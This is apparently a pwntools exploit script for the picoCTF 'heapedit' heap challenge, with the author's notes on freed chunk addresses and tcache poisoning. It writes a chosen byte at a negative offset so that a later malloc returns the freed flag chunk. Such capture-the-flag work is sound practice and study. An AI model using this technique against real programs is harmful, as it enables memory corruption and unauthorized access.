#!/usr/bin/python3
from pwn import *


local_bin = "./heapedit"
elf = ELF(local_bin)
rop = ROP(elf)

#p = remote("mercury.picoctf.net",49825)
#p = process(local_bin)
p = gdb.debug(local_bin, '''
	#break main
	#break *main+183
	#break *main+318
	break *main+397
	break *main+497
	break *main+579
	continue
	''')


'''

while ./exploit.py; do echo 'test'; done

flag is malloced at these areas of size 0x80:
0x603490
0x603520
0x6035b0
0x603640
0x6036d0
0x603760
0x6037f0

random string malloced here: 
0x603880

call to 2 free
1. free flag 0x6037f0
2. free random string 0x603880

the last list is tcached therefore if i 
malloc again, it will land into the last freed region
at address = 0x603880

We have byte that we can edit

Address to edit is added with old flag memory at 0x603490

Tcache is stored here 0x6020c8
it stores the pointer to the last freed address

By setting it to point to our initial heap allocation, we can malloc it again
Then it will be printed!
last freed = 0x603880
pwndbg> x/gx 0x6020c8
0x6020c8:       0x0000000000603880

Set it to 0x603480



'''

output = p.recvuntil(b'Address')

#address_edit = p64(0x603880-1,endian='big')

address_edit = -5064+1
payload = b''
payload += (str(address_edit)).encode('utf-8')
p.sendline(payload)
#p.sendline(b'603880')
#p.sendline(address_edit)

output = p.recvuntil(b'Value')
p.sendline(b'\x34')


p.interactive()


